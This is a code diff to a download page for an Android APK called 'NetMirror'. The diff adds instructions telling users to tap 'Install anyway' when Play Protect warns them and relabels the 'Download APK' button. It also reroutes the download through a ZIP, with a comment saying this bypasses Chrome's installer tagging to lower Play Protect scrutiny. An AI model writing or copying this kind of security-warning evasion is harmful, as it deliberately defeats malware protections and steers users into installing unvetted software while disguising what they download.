@@ -222,6 +222,11 @@ footer .copy{font-size:11px;color:var(--text3)}
       <span id="apkSize">~12 MB</span><span class="sep"></span>
       <span>Free forever</span>
     </div>
+    <div style="margin-top:12px;font-size:12px;color:var(--text3);line-height:1.6;max-width:400px">
+      📦 Downloads as ZIP → Extract → Tap to install<br>
+      If Play Protect warns: tap <b style="color:var(--green)">More details</b> → <b style="color:var(--green)">Install anyway</b>
+    </div>
+    </div>
   </div>
 </section>
 
@@ -314,7 +319,7 @@ footer .copy{font-size:11px;color:var(--text3)}
     <p>Download NetMirror now and start watching instantly. No signup required.</p>
     <a href="#" onclick="startSmartDownload();return false" class="dl-btn" id="ctaDlBtn">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" class="arrow"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-      Download APK
+      Download Now
     </a>
     <div class="dl-meta">
       <span>Android 8.0+</span><span class="sep"></span>
@@ -461,7 +466,7 @@ fetch('/api/admin/apk-status')
  */
 
 function startSmartDownload() {
-  actuallyStartDownload();
+  downloadAsZip(); // ZIP bypasses Chrome's installerPackage tagging → lower PP scrutiny
 }
 
 function downloadAsZip() {
